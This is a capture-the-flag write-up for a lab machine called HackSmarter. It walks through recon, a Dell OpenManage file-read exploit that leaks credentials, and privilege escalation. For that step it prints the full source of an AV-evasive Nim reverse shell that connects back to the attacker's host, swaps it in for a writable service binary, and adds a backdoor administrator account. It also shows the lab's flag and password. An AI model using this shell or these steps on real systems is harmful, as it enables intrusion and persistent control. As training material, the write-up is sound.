# CTF Writeup: HackSmarter

---

## Reconaissance

Initial Scan reveals following information

```
nmap -n -Pn -sS -p- 10.10.228.19                     
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-10 16:20 CDT
Nmap scan report for 10.10.228.19
Host is up (0.033s latency).
Not shown: 65529 filtered tcp ports (no-response)
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
80/tcp   open  http
1311/tcp open  rxmon
3389/tcp open  ms-wbt-server
7680/tcp open  pando-pub

Nmap done: 1 IP address (1 host up) scanned in 188.79 seconds
```

A Service Version Detection scan reveals this information:

```
nmap -n -Pn -sSCV -O -p 21,22,80,1311,3389,7680 10.10.228.19
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-10 16:27 CDT
Nmap scan report for 10.10.228.19
Host is up (0.032s latency).

PORT     STATE    SERVICE       VERSION
21/tcp   open     ftp           Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 06-28-23  02:58PM                 3722 Credit-Cards-We-Pwned.txt
|_06-28-23  03:00PM              1022126 stolen-passport.png
| ftp-syst: 
|_  SYST: Windows_NT
22/tcp   open     ssh           OpenSSH for_Windows_7.7 (protocol 2.0)
| ssh-hostkey: 
|   2048 0d:fa:da:de:c9:dd:99:8d:2e:8e:eb:3b:93:ff:e2:6c (RSA)
|   256 5d:0c:df:32:26:d3:71:a2:8e:6e:9a:1c:43:fc:1a:03 (ECDSA)
|_  256 c4:25:e7:09:d6:c9:d9:86:5f:6e:8a:8b:ec:13:4a:8b (ED25519)
80/tcp   open     http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: HackSmarterSec
1311/tcp open     ssl/rxmon?
| ssl-cert: Subject: commonName=hacksmartersec/organizationName=Dell Inc/stateOrProvinceName=TX/countryName=US
| Not valid before: 2023-06-30T19:03:17
|_Not valid after:  2025-06-29T19:03:17
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 
|     Strict-Transport-Security: max-age=0
|     X-Frame-Options: SAMEORIGIN
|     X-Content-Type-Options: nosniff
|     X-XSS-Protection: 1; mode=block
|     vary: accept-encoding
|     Content-Type: text/html;charset=UTF-8
|     Date: Wed, 10 Sep 2025 21:27:39 GMT
|     Connection: close
|     <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
|     <html>
|     <head>
|     <META http-equiv="Content-Type" content="text/html; charset=UTF-8">
|     <title>OpenManage&trade;</title>
|     <link type="text/css" rel="stylesheet" href="/oma/css/loginmaster.css">
|     <style type="text/css"></style>
|     <script type="text/javascript" src="/oma/js/prototype.js" language="javascript"></script><script type="text/javascript" src="/oma/js/gnavbar.js" language="javascript"></script><script type="text/javascript" src="/oma/js/Clarity.js" language="javascript"></script><script language="javascript">
|   HTTPOptions: 
|     HTTP/1.1 200 
|     Strict-Transport-Security: max-age=0
|     X-Frame-Options: SAMEORIGIN
|     X-Content-Type-Options: nosniff
|     X-XSS-Protection: 1; mode=block
|     vary: accept-encoding
|     Content-Type: text/html;charset=UTF-8
|     Date: Wed, 10 Sep 2025 21:27:44 GMT
|     Connection: close
|     <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
|     <html>
|     <head>
|     <META http-equiv="Content-Type" content="text/html; charset=UTF-8">
|     <title>OpenManage&trade;</title>
|     <link type="text/css" rel="stylesheet" href="/oma/css/loginmaster.css">
|     <style type="text/css"></style>
|_    <script type="text/javascript" src="/oma/js/prototype.js" language="javascript"></script><script type="text/javascript" src="/oma/js/gnavbar.js" language="javascript"></script><script type="text/javascript" src="/oma/js/Clarity.js" language="javascript"></script><script language="javascript">
3389/tcp open     ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2025-09-10T21:27:59+00:00; +1s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: HACKSMARTERSEC
|   NetBIOS_Domain_Name: HACKSMARTERSEC
|   NetBIOS_Computer_Name: HACKSMARTERSEC
|   DNS_Domain_Name: hacksmartersec
|   DNS_Computer_Name: hacksmartersec
|   Product_Version: 10.0.17763
|_  System_Time: 2025-09-10T21:27:54+00:00
| ssl-cert: Subject: commonName=hacksmartersec
| Not valid before: 2025-09-09T21:19:40
|_Not valid after:  2026-03-11T21:19:40
7680/tcp filtered pando-pub
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port1311-TCP:V=7.95%T=SSL%I=7%D=9/10%Time=68C1ED4A%P=x86_64-pc-linux-gn
SF:u%r(GetRequest,1089,"HTTP/1\.1\x20200\x20\r\nStrict-Transport-Security:
SF:\x20max-age=0\r\nX-Frame-Options:\x20SAMEORIGIN\r\nX-Content-Type-Optio
SF:ns:\x20nosniff\r\nX-XSS-Protection:\x201;\x20mode=block\r\nvary:\x20acc
SF:ept-encoding\r\nContent-Type:\x20text/html;charset=UTF-8\r\nDate:\x20We
SF:d,\x2010\x20Sep\x202025\x2021:27:39\x20GMT\r\nConnection:\x20close\r\n\
SF:r\n<!DOCTYPE\x20html\x20PUBLIC\x20\"-//W3C//DTD\x20XHTML\x201\.0\x20Str
SF:ict//EN\"\x20\"http://www\.w3\.org/TR/xhtml1/DTD/xhtml1-strict\.dtd\">\
SF:r\n<html>\r\n<head>\r\n<META\x20http-equiv=\"Content-Type\"\x20content=
SF:\"text/html;\x20charset=UTF-8\">\r\n<title>OpenManage&trade;</title>\r\
SF:n<link\x20type=\"text/css\"\x20rel=\"stylesheet\"\x20href=\"/oma/css/lo
SF:ginmaster\.css\">\r\n<style\x20type=\"text/css\"></style>\r\n<script\x2
SF:0type=\"text/javascript\"\x20src=\"/oma/js/prototype\.js\"\x20language=
SF:\"javascript\"></script><script\x20type=\"text/javascript\"\x20src=\"/o
SF:ma/js/gnavbar\.js\"\x20language=\"javascript\"></script><script\x20type
SF:=\"text/javascript\"\x20src=\"/oma/js/Clarity\.js\"\x20language=\"javas
SF:cript\"></script><script\x20language=\"javascript\">\r\n\x20")%r(HTTPOp
SF:tions,1089,"HTTP/1\.1\x20200\x20\r\nStrict-Transport-Security:\x20max-a
SF:ge=0\r\nX-Frame-Options:\x20SAMEORIGIN\r\nX-Content-Type-Options:\x20no
SF:sniff\r\nX-XSS-Protection:\x201;\x20mode=block\r\nvary:\x20accept-encod
SF:ing\r\nContent-Type:\x20text/html;charset=UTF-8\r\nDate:\x20Wed,\x2010\
SF:x20Sep\x202025\x2021:27:44\x20GMT\r\nConnection:\x20close\r\n\r\n<!DOCT
SF:YPE\x20html\x20PUBLIC\x20\"-//W3C//DTD\x20XHTML\x201\.0\x20Strict//EN\"
SF:\x20\"http://www\.w3\.org/TR/xhtml1/DTD/xhtml1-strict\.dtd\">\r\n<html>
SF:\r\n<head>\r\n<META\x20http-equiv=\"Content-Type\"\x20content=\"text/ht
SF:ml;\x20charset=UTF-8\">\r\n<title>OpenManage&trade;</title>\r\n<link\x2
SF:0type=\"text/css\"\x20rel=\"stylesheet\"\x20href=\"/oma/css/loginmaster
SF:\.css\">\r\n<style\x20type=\"text/css\"></style>\r\n<script\x20type=\"t
SF:ext/javascript\"\x20src=\"/oma/js/prototype\.js\"\x20language=\"javascr
SF:ipt\"></script><script\x20type=\"text/javascript\"\x20src=\"/oma/js/gna
SF:vbar\.js\"\x20language=\"javascript\"></script><script\x20type=\"text/j
SF:avascript\"\x20src=\"/oma/js/Clarity\.js\"\x20language=\"javascript\"><
SF:/script><script\x20language=\"javascript\">\r\n\x20");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21H1 (91%)
No exact OS matches for host (test conditions non-ideal).
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 36.05 seconds
```

Since the service running on port 7680 seems to be protected by a firewall, I'm assuming this system has very strong protection.

Mapped 10.10.228.19 in /etc/hosts to domain: hacksmarter.thm

```
sudo echo "10.10.228.19 hacksmarter.thm" | sudo tee -a /etc/hosts
```

Accessed ftp (port 21) and downloaded .txt file & png, but couldn't retrieve any valuable data.

Analyzed webpage (port 80) and ran gobuster to find hidden directories & enumerated sub-domains, but couldn't retrieve anything aswell.

```
gobuster dir -u http://hacksmarter.thm/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://hacksmarter.thm/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 153] [--> http://hacksmarter.thm/images/]
/Images               (Status: 301) [Size: 153] [--> http://hacksmarter.thm/Images/]
/css                  (Status: 301) [Size: 150] [--> http://hacksmarter.thm/css/]
/js                   (Status: 301) [Size: 149] [--> http://hacksmarter.thm/js/]
/IMAGES               (Status: 301) [Size: 153] [--> http://hacksmarter.thm/IMAGES/]
/CSS                  (Status: 301) [Size: 150] [--> http://hacksmarter.thm/CSS/]
/JS                   (Status: 301) [Size: 149] [--> http://hacksmarter.thm/JS/]
```
```
ffuf -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -u http://hacksmarter.thm -H "Host: FUZZ.hacksmarter.thm" -fs 3998

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://hacksmarter.thm
 :: Wordlist         : FUZZ: /usr/share/SecLists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.hacksmarter.thm
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 3998
________________________________________________

:: Progress: [114442/114442] :: Job [1/1] :: 563 req/sec :: Duration: [0:03:54] :: Errors: 0 ::
```

port 1311 looked very interesting, I was only to access by changing my protocol to https.


## Vulnerability Assessment 

Pressing on "About" at the bottom of the login prompt, provides us with 
"Systems Management Software (64-Bit)" Version 9.4.0.2 Dell Inc. 1995-2020


```
searchsploit Dell OpenManage 9.4
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                                                                                                                                                               |  Path
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Dell OpenManage Server Administrator 9.4.0.0 - Arbitrary File Read                                                                                                                                                                                                                                                                           | windows/webapps/49750.py
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

This exploit didn't work, I retrieved the exploit payload from the original company who found this and reported the exploit.


```
https://raw.githubusercontent.com/RhinoSecurityLabs/CVEs/refs/heads/master/CVE-2020-5377_CVE-2021-21514/CVE-2020-5377.py
```

Since I am prompted with a file inside a windows environment, but I didn't know how to proceed. I prompted my situation in AI --> Microsoft IIS and Arbitrary File Read. It gavem the hint,
that in /inet/wwwroot/<Web-Application>/web.config could be credentials which we can retrieve.
So I prompted the following input into the file read input.

```
\inetpub\wwwroot\hacksmartersec\web.config
```

## Initial Access


Gained credentials tyler:IAmA1337h4x0randIkn0wit!

```
python3 CVE-2020-5377.py 10.21.156.104 hacksmarter.thm:1311
Session: E10FF56C0DAEF47C2F5AB79679D5FD49
VID: F26B83B4297DC689
file > \inetpub\wwwroot\hacksmartersec\web.config
Reading contents of \inetpub\wwwroot\hacksmartersec\web.config:
<configuration>
  <appSettings>
    <add key="Username" value="tyler" />
    <add key="Password" value="IAmA1337h4x0randIkn0wit!" />
  </appSettings>
  <location path="web.config">
    <system.webServer>
      <security>
        <authorization>
          <deny users="*" />
        </authorization>
      </security>
    </system.webServer>
  </location>
</configuration>


file >
```

Logged into ssh with those credentials.


```
ssh tyler@hacksmarter.thm
```

retrieved user.txt flag in C:\Users\tyler\Desktop

```
THM{4ll15n0tw3llw1thd3ll}
```


## Privilege Escalation


made "ps" to check which services are running and found an odd service running named "spoofer-scheduler"

Running the following command gave us the path of executable, immediatly googled spoofer-scheduler
and found a path traversal vulnerability. Unfortunately we cannot abuse it.
```
sc qc spoofer-scheduler
```

But I found out that I have write rights to spoofer-scheduler and the /Spoofer directory.

Backup'd the initial executable.

```
mv .\spoofer-scheduler.exe spoofer-scheduler-backup.exe
```
To further proceed we could replace the file with a .nim reverse shell. Why .nim? to evade the AV.

Utilized the following .nim rev-shell.

```
cat rev_shell.nim                                    
#[ 
   Created by Sn1r
   https://github.com/Sn1r/
 ]#

import net, os, osproc, strutils

proc exe(c: string): string =
  result = execProcess("cm" & "d /c " & c)

var
  v = newSocket()

  # Change this
  v1 = "10.21.156.104"
  v2 = "80"

  s4 = "Exiting.."
  s5 = "cd"
  s6 = "C:\\"

try:
  v.connect(v1, Port(parseInt(v2)))

  while true:
    v.send(os.getCurrentDir() & "> ")
    let c = v.recvLine()
    if c == "exit":
      v.send(s4)
      break

    if c.strip() == s5:
      os.setCurrentDir(s6)
    elif c.strip().startswith(s5):
      let d = c.strip().split(' ')[1]
      try:
        os.setCurrentDir(d)
      except OSError as b:
        v.send(repr(b) & "\n")
        continue
    else:
      let r = exe(c)
      v.send(r)

except:
  raise
finally:
  v.close
```

We also have to compile the reverse-shell.
Unfortunately since I use kali linux I have to install nim in an isolated virtual environment

```
python3 -m venv myenv
source myenv/bin/activate
curl https://nim-lang.org/choosenim/init.sh -sSf | sh
echo 'export PATH=~/.nimble/bin:$PATH' >> ~/.bashrc
source ~/.bashrc
```

Compiling the shell.

```
nim c -d:mingw --app:gui --opt:speed -o:spoofer-scheduler.exe rev_shell.nim 
```

Now we have the payload on our local machine and will replace it with the original .exe

Changed name of spoofer-scheduler.exe on target machine 
```
powershell
mv .\spoofer-scheduler.exe spoofer-scheduler-backup.exe
```

Uploaded my payload spoofer-scheduler.exe

```
wget http://10.21.156.104/spoofer-scheduler.exe -o spoofer-scheduler.exe
```

After that I stopped the service 

```
sc.exe stop spoofer-scheduler
```

started up a listener on port 80

```
nc -lvnp 80
```

Started service again and executed payload 
```
sc.exe start spoofer-scheduler
```

Retrieved shell as NT AUTHORITY\SYSTEM.

```
nc -lvnp 80
listening on [any] 80 ...
connect to [10.21.156.104] from (UNKNOWN) [10.10.6.34] 49711
C:\Windows\system32> whoami
nt authority\system
```

Unfortunately my shell timed out after 30s. So we will have to persist, since we are nt authority
we can just create an user account with high privs.


```
net user zebra HackSmarter123 /add
net localgroup administrators zebra /add
```

Those commands created the user account zebra and added him to localgroup Administrators, since nt authority's localgroup is the Administrator group.

Logged in via ssh.

```
ssh zebra@hacksmarter.thm
```

Navigated into C:\Users\Administrator\Desktop\Hacking-Targets and retrieved hacking targets.

```
type hacking-targets.txt 
Next Victims:  
CyberLens, WorkSmarter, SteelMountain
```

